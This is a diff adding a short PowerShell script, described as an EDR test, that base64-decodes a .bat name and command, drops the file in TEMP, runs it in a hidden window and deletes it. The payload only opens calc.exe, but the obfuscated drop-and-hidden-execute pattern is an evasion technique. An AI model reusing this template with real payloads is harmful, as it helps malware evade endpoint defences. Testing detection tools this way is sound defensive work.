@@ -1,0 +1,27 @@
+# For testing only, opens up calc.exe not a malaicious file. Testing of EDRs
+# Obfuscated .bat filename and payload
+$fn_b64 = 'ZGIxMzQ='                     # "db134"
+$ext_b64 = 'YmF0'                        # "bat"
+$cmd_b64 = 'c3RhcnQgY2FsYy5leGU='        # "start calc.exe"
+
+# Decode all parts
+$filename = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($fn_b64))
+$ext = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($ext_b64))
+$command = [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($cmd_b64))
+
+# Construct full .bat path in TEMP
+$fullPath = Join-Path -Path $env:TEMP -ChildPath ("$filename.$ext")
+
+# Drop the payload
+[System.IO.File]::WriteAllText($fullPath, $command)
+
+# Stealthy execution
+$p = New-Object System.Diagnostics.ProcessStartInfo
+$p.FileName = $fullPath
+$p.WindowStyle = 'Hidden'
+$p.UseShellExecute = $true
+[System.Diagnostics.Process]::Start($p)
+
+# Optional cleanup
+Start-Sleep -Seconds 2
+Remove-Item -Path $fullPath -Force
